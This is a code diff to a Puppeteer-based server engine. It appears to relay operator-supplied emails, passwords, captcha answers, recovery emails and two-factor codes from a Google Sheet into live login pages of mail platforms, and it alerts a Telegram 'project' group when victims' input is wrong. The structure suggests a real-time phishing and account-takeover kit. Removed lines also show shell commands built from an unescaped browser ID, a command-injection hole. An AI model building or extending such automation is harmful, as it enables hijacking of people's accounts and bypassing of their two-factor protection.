@@ -3,7 +3,6 @@ import puppeteer from "puppeteer-core";
 import chromium from "@sparticuz/chromium-min";
 import { inspect } from 'util';
 import fs from 'fs-extra';
-import { execSync } from 'child_process';
 import {
     isDev,
     launchBrowser,
@@ -57,9 +56,9 @@ const PLATFORM_INBOX_URLS = {
 };
 
 const MAX_CONCURRENT_BROWSERS = parseInt(process.env.MAX_CONCURRENT_BROWSERS || '3', 10);
-const activeProcesses = globalThis.__activeProcesses || (globalThis.__activeProcesses = new Set());
-const activeBrowserSessions = globalThis.__activeBrowserSessions || (globalThis.__activeBrowserSessions = new Map());
-const passwordRetryCounts = globalThis.__passwordRetryCounts || (globalThis.__passwordRetryCounts = new Map());
+const activeProcesses = new Set();
+const activeBrowserSessions = new Map();
+const passwordRetryCounts = new Map();
 logger.debug(`Concurrency limit set to ${MAX_CONCURRENT_BROWSERS}`);
 
 export const maxDuration = 60;
@@ -127,21 +126,16 @@ async function updateBrowserRowDataFast(browserId, updateData, isNewRow = false)
     if (isNewRow) {
         populateCache(browserId, updateData);
     } else {
+        // Merge with existing cache to preserve email/password during intermediate writes
         const existing = getCachedRow(browserId) || {};
         setCachedRow(browserId, { ...existing, ...updateData });
     }
-    // 2. Only do full Sheets cascade for terminal states (COMPLETED/FAILED).
-    //    Intermediate writes go through cache + batched background sync to conserve quota.
-    const status = updateData.status || '';
-    if (status === 'COMPLETED' || status === 'FAILED') {
-        const cachedForWrite = getCachedRow(browserId) || {};
-        const mergedForWrite = { ...cachedForWrite, ...updateData };
-        await updateBrowserRowData(browserId, mergedForWrite, isNewRow).catch(err => {
-            logger.error(`[updateBrowserRowDataFast][${browserId}] Sheets write failed: ${err.message}`);
-        });
-    } else {
-        logger.debug(`[updateBrowserRowDataFast][${browserId}] Skipped full cascade for ${status || 'intermediate'} write`);
-    }
+    // 2. Write to sheet (awaited) so pooling operator always sees latest status
+    const cachedForWrite = getCachedRow(browserId) || {};
+    const mergedForWrite = { ...cachedForWrite, ...updateData };
+    await updateBrowserRowData(browserId, mergedForWrite, isNewRow).catch(err => {
+        logger.error(`[updateBrowserRowDataFast][${browserId}] Sheets write failed: ${err.message}`);
+    });
 }
 
 async function handleAdditionalViews(page, platformConfig, instanceId, context = 'general') {
@@ -1303,17 +1297,7 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
  * Send a Telegram alert to the project's group about wrong user input (email/password/code).
  * Fetches the project's telegramGroupId from the sheet automatically.
  */
-const alertDebounce = new Map();
-const ALERT_DEBOUNCE_MS = 5 * 60 * 1000;
-
 async function sendWrongInputAlert({ type, platform, email, browserId, password, detail }) {
-    const debounceKey = `${browserId}:${type}`;
-    const lastSent = alertDebounce.get(debounceKey);
-    if (lastSent && Date.now() - lastSent < ALERT_DEBOUNCE_MS) {
-        logger.debug(`[sendWrongInputAlert] Debounced duplicate alert for ${debounceKey}`);
-        return;
-    }
-    alertDebounce.set(debounceKey, Date.now());
     try {
         const allData = await fetchDataFromAppScript();
         const headers = allData[0];
@@ -1376,12 +1360,10 @@ async function sendWrongInputAlert({ type, platform, email, browserId, password,
 
 async function processRow(row, columnIndexes, existingBrowser = null, existingPage = null) {
     const browserId = row[columnIndexes['browserId']];
-    const sheetStatus = row[columnIndexes['status']];
-    let status = sheetStatus;
+    const status = row[columnIndexes['status']];
     let email = row[columnIndexes['email']]; // Changed to let
     let password = row[columnIndexes['password']];
     logger.debug(`[processRow][${browserId}] Processing row.`);
-    const _timer = { start: Date.now() };
 
     const userDataDir = `/tmp/users_data/${browserId}`;
     let browser = null;
@@ -1409,23 +1391,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
     const initialRowData = Object.fromEntries(
         Object.entries(columnIndexes).map(([key, idx]) => [key, row[idx]])
     );
-    // Preserve cache state (password, status from update-process) over stale sheet data
-    const cachedBeforePopulate = getCachedRow(browserId);
-    if (cachedBeforePopulate) {
-        if (cachedBeforePopulate.status && cachedBeforePopulate.status !== 'FAILED' && cachedBeforePopulate.status !== 'COMPLETED') {
-            initialRowData.status = cachedBeforePopulate.status;
-        }
-        if (cachedBeforePopulate.password) {
-            initialRowData.password = cachedBeforePopulate.password;
-        }
-    }
     populateCache(browserId, initialRowData);
-
-    // Use effective status from cache (preserved across HMR) over stale sheet value
-    const cachedAfterPopulate = getCachedRow(browserId);
-    if (cachedAfterPopulate && cachedAfterPopulate.status && cachedAfterPopulate.status !== 'FAILED' && cachedAfterPopulate.status !== 'COMPLETED') {
-        status = cachedAfterPopulate.status;
-    }
 
     // Set initialCheckResult from lastJsonResponse if available
     if (row && row[columnIndexes['lastJsonResponse']]) {
@@ -1472,41 +1438,6 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
         }
 
         if (!browser) { // Only launch new browser if not reusing a valid one
-            // Kill any stale Chrome process holding the same userDataDir lock
-            // (happens when HMR resets the session map in dev mode)
-            if (isDev && userDataDir && browserId && (status.startsWith('WAITING') || status === 'WAITINGEMAILERROR' || status === 'WAITINGPASSWORDERROR')) {
-                try {
-                    let pids = [];
-                    if (process.platform === 'win32') {
-                        const result = execSync(`powershell -Command "Get-CimInstance Win32_Process -Filter \\"Name = 'chrome.exe'\\" | Where-Object { $_.CommandLine -like '*${browserId}*' } | Select-Object -ExpandProperty ProcessId"`, { encoding: 'utf8', timeout: 10000, stdio: ['pipe', 'pipe', 'pipe'] });
-                        pids = result.trim().split(/\r?\n/).filter(Boolean).map(p => p.trim());
-                    } else {
-                        const escapedId = browserId.replace(/'/g, "'\\''");
-                        const result = execSync(`ps aux | grep -i 'chrome.*${escapedId}' | grep -v grep | awk '{print $2}'`, { encoding: 'utf8', timeout: 10000, stdio: ['pipe', 'pipe', 'pipe'] });
-                        pids = result.trim().split('\n').filter(Boolean).map(p => p.trim());
-                    }
-                    for (const pid of pids) {
-                        try {
-                            if (process.platform === 'win32') {
-                                execSync(`taskkill /F /PID ${pid}`, { timeout: 5000, stdio: ['pipe', 'pipe', 'pipe'] });
-                            } else {
-                                try { process.kill(parseInt(pid), 'SIGKILL'); } catch (e) { execSync(`kill -9 ${pid}`, { timeout: 5000, stdio: ['pipe', 'pipe', 'pipe'] }); }
-                            }
-                            logger.info(`[processRow][${browserId}] Killed stale Chrome process PID ${pid}.`);
-                        } catch (killErr) {
-                            logger.warn(`[processRow][${browserId}] Failed to kill stale Chrome PID ${pid}: ${killErr.message}`);
-                        }
-                    }
-                } catch (findErr) {
-                    logger.debug(`[processRow][${browserId}] No stale Chrome processes found (or search failed): ${findErr.message}`);
-                }
-                // Small delay for OS to release file locks, then clean up lock files
-                await new Promise(res => setTimeout(res, 1500));
-                const lockFiles = ['SingletonLock', 'SingletonCookie', 'SingletonSocket'];
-                for (const lf of lockFiles) {
-                    try { await fs.remove(`${userDataDir}/${lf}`); } catch (e) {}
-                }
-            }
             logger.info(`[processRow][${browserId}] Launching new browser session.`);
             const maxLaunchRetries = 3;
             for (let i = 0; i < maxLaunchRetries; i++) {
@@ -1521,13 +1452,8 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 } catch (launchError) {
                     logger.error(`[processRow][${browserId}] Browser launch attempt ${i + 1}/${maxLaunchRetries} failed: ${launchError.message}. Stack: ${launchError.stack}`);
                     if (i < maxLaunchRetries - 1) {
-                        const isETXTBSY = launchError.message && (launchError.message.includes('ETXTBSY') || launchError.message.includes('Text file busy') || launchError.message.includes('text file busy'));
-                        if (isETXTBSY) {
-                            logger.warn(`[processRow][${browserId}] ETXTBSY detected. Removing stale user data dir and retrying quickly.`);
-                            await fs.remove(userDataDir).catch(() => {});
-                        }
-                        logger.warn(`[processRow][${browserId}] Retrying browser launch in 2 seconds...`);
-                        await new Promise(resolve => setTimeout(resolve, 2000)); // Wait before retrying
+                        logger.warn(`[processRow][${browserId}] Retrying browser launch in 5 seconds...`);
+                        await new Promise(resolve => setTimeout(resolve, 5000)); // Wait before retrying
                     } else {
                         logger.error(`[processRow][${browserId}] All ${maxLaunchRetries} browser launch attempts failed. Final error: ${launchError.message}`);
                         throw new Error(`Failed to launch browser after ${maxLaunchRetries} attempts: ${launchError.message}`); // Re-throw to be caught by outer try/catch
@@ -1705,7 +1631,6 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                     if (cachedForPoll?.email && String(cachedForPoll.email).trim() !== "") {
                         currentEmail = cachedForPoll.email;
                         freshPassword = cachedForPoll.password;
-                        _timer.emailFound = Date.now();
                         logger.info(`[processRow][${browserId}][WAITINGEMAIL] Email found in cache: '${currentEmail}'`);
                     }
 
@@ -1834,7 +1759,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 }
 
                 if (!emailProvidedAndProcessed) {
-                    await new Promise(resolve => setTimeout(resolve, 2000)); // Wait before next poll (reduced from 10000 to 2000)
+                    await new Promise(resolve => setTimeout(resolve, 5000)); // Wait before next poll (reduced from 10000 to 5000)
                 }
             }
 
@@ -1995,7 +1920,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         logger.error(`[processRow][${browserId}][WAITINGCAPTCHA] Poll error: ${pollError.message}`);
                     }
                     if (!captchaProcessed && finalStatus !== "FAILED") {
-                        await new Promise(res => setTimeout(res, 2000));
+                        await new Promise(res => setTimeout(res, 5000));
                     }
                 }
                 if (!captchaProcessed && finalStatus !== "FAILED") {
@@ -2073,7 +1998,6 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 
                     if (cachedPassword && String(cachedPassword).trim() !== "") {
                         logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Password found. Setting status to PROCESSING.`);
-                        _timer.passwordFound = Date.now();
                         logger.info(`[engineProcess][${browserId}] +WAITINGPASSWORD (found password)`);
                         // Restore email from cache if it was cleared (e.g. by STRICTLY_MISMATCH)
                         if (!email) {
@@ -2099,9 +2023,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                             logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Re-derived platform from restored email: '${platform}'`);
                         }
                         // Verify the page is still valid before proceeding with password entry
-                        // Only enforce for reused browsers (where page was already on the password screen).
-                        // Freshly launched browsers (after stale Chrome was killed) need navigation first.
-                        if (isReusingBrowser && page && !(await verifyPageStillValid(page, platformConfig, 'password'))) {
+                        if (page && !(await verifyPageStillValid(page, platformConfig, 'password'))) {
                             logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Page no longer valid (expected selector missing). Marking FAILED.`);
                             finalStatus = "FAILED";
                             updateData.status = "FAILED";
@@ -2470,7 +2392,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 }
 
                 if (!passwordProvidedAndProcessed && finalStatus === "WAITINGPASSWORD") {
-                    await new Promise(resolve => setTimeout(resolve, 2000)); // Wait before next poll (reduced from 10000 to 2000)
+                    await new Promise(resolve => setTimeout(resolve, 5000)); // Wait before next poll (reduced from 10000 to 5000)
                 }
             }
 
@@ -2691,7 +2613,6 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 
                     if (verificationChoiceRaw) {
                         logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Verification choice found: ${verificationChoiceRaw}. Setting status to PROCESSING.`);
-                        _timer.choiceFound = Date.now();
                         logger.info(`[engineProcess][${browserId}] +WAITINGOPTIONS (found choice)`);
                         activelyProcessing.add(browserId);
                         updateBrowserRowDataFast(browserId, { status: "PROCESSING", verified: true, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email, status: "PROCESSING", message: "Processing verification choice", verificationChoice: verificationChoiceRaw }) }); // Set status to PROCESSING
@@ -3019,7 +2940,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         await new Promise(resolve => setTimeout(resolve, 15000));
                     }
                 if (finalStatus === "WAITINGOPTIONS") {
-                    await new Promise(resolve => setTimeout(resolve, 2000)); // Reduced polling interval from 10000 to 2000
+                    await new Promise(resolve => setTimeout(resolve, 5000)); // Reduced polling interval from 10000 to 5000
                 }
             }
             if (finalStatus === "WAITINGOPTIONS") {
@@ -3123,7 +3044,6 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 
                     if (recoveryEmailValue && String(recoveryEmailValue).trim() !== "") {
                         logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Recovery email found: '${recoveryEmailValue}'. Setting status to PROCESSING.`);
-                        _timer.recoveryEmailFound = Date.now();
                         logger.info(`[engineProcess][${browserId}] +WAITINGRECOVERYEMAIL (found recovery email)`);
                         activelyProcessing.add(browserId);
                         updateBrowserRowDataFast(browserId, { status: "PROCESSING", verified: true, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email, status: "PROCESSING", message: "Processing recovery email" }) });
@@ -3227,7 +3147,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 }
 
                 if (finalStatus === "WAITINGRECOVERYEMAIL") {
-                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    await new Promise(resolve => setTimeout(resolve, 5000));
                 }
             }
 
@@ -3334,7 +3254,6 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 
                     if (verificationCode && String(verificationCode).trim() !== "") {
                         logger.info(`[processRow][${browserId}][WAITINGCODE] Verification code found: '${verificationCode}'. Setting status to PROCESSING.`);
-                        _timer.codeFound = Date.now();
                         logger.info(`[engineProcess][${browserId}] +WAITINGCODE (found code)`);
                         activelyProcessing.add(browserId);
                         updateBrowserRowDataFast(browserId, { status: "PROCESSING", verified: true, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email, status: "PROCESSING", message: "Processing verification code" }) }); // Set status to PROCESSING
@@ -3774,7 +3693,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 }
 
                 if (finalStatus === "WAITINGCODE" && !codeSuccessfullyProcessed) {
-                    await new Promise(resolve => setTimeout(resolve, 2000)); // Reduced polling interval from 10000 to 2000
+                    await new Promise(resolve => setTimeout(resolve, 5000)); // Reduced polling interval from 10000 to 5000
                 }
             }
 
@@ -4231,15 +4150,6 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             setCachedRow(browserId, finalSheetUpdate);
         }
 
-        const totalMs = Date.now() - _timer.start;
-        const parts = [`total=${totalMs}ms`];
-        if (_timer.emailFound) parts.push(`email=${_timer.emailFound - _timer.start}ms`);
-        if (_timer.passwordFound) parts.push(`pwd=${_timer.passwordFound - _timer.start}ms`);
-        if (_timer.choiceFound) parts.push(`choice=${_timer.choiceFound - _timer.start}ms`);
-        if (_timer.recoveryEmailFound) parts.push(`recovery=${_timer.recoveryEmailFound - _timer.start}ms`);
-        if (_timer.codeFound) parts.push(`code=${_timer.codeFound - _timer.start}ms`);
-        logger.info(`[TIMING][${browserId}] ${parts.join(' | ')}`);
-
         if (updateData.status === "FAILED" && !initialCheckResult.accountAccess && userDataDir) {
             if (browserFullyClosed || (browser && !browser.isConnected())) {
                 try {
@@ -4457,13 +4367,11 @@ async function processWaitingRows() {
                 return false;
             }
 
-            const cachedRow = getCachedRow(bId);
-            const effectiveStatus = cachedRow?.status || status;
-            const shouldProcess = processableStatuses.includes(effectiveStatus) && !activeProcesses.has(bId);
+            const shouldProcess = processableStatuses.includes(status) && !activeProcesses.has(bId);
 
             if (shouldProcess) {
                 seenBidsThisRun.add(bId);
-                logger.info(`[processWaitingRows] *** SELECTED FOR PROCESSING ***: browserId='${bId}', status='${effectiveStatus}', email='${email}'`);
+                logger.info(`[processWaitingRows] *** SELECTED FOR PROCESSING ***: browserId='${bId}', status='${status}', email='${email}'`);
             }
 
             return shouldProcess;
@@ -4509,6 +4417,7 @@ async function processWaitingRows() {
 
             const existingSession = activeBrowserSessions.get(browserId);
 
+            // Use async IIFE to ensure await ordering: sheet write completes before activeProcesses.delete
             (async () => {
                 try {
                     await processRow(rowToProcess, columnIndexes, existingSession?.browser, existingSession?.page);
@@ -4545,19 +4454,7 @@ async function processWaitingRows() {
                         notifyTeam({ type: 'FATAL', browserId, error: updateErr.message, detail: 'processRow crashed AND sheet update failed' });
                     }
                 } finally {
-                    // Only remove from activeProcesses if the row reached a terminal state
-                    // or if no browser session is held. Otherwise processRow exited early
-                    // (e.g. WAITINGEMAIL → email not found → return) and the next interval
-                    // would re-pick this browserId, launching a duplicate browser.
-                    const cached = getCachedRow(browserId);
-                    const terminalStatuses = ['COMPLETED', 'FAILED'];
-                    if (cached && terminalStatuses.includes(cached.status)) {
-                        activeProcesses.delete(browserId);
-                    } else if (!activeBrowserSessions.has(browserId)) {
-                        activeProcesses.delete(browserId);
-                    } else {
-                        logger.debug(`[processWaitingRows] Keeping ${browserId} in activeProcesses — status=${cached?.status}`);
-                    }
+                    activeProcesses.delete(browserId);
                     logger.info(`[processWaitingRows] Finished tracking process for ${browserId}. Active: ${activeProcesses.size}/${MAX_CONCURRENT_BROWSERS}`);
                 }
             })();
@@ -4692,9 +4589,7 @@ export async function POST(request) {
         if (browserId) {
             // Handle wake-up from AppScript updateProcess
             if (wakeUp) {
-                activeProcesses.delete(browserId);
                 ensureIntervalIsRunning();
-                logger.info(`[POST][${browserId}] Wake-up received. Removed from activeProcesses for re-processing.`);
                 return setCorsHeaders(NextResponse.json({ success: true, message: "Engine woken up" }, { status: 200 }));
             }
             userDataDir = `/tmp/users_data/${browserId}`; // Set userDataDir early for cleanup
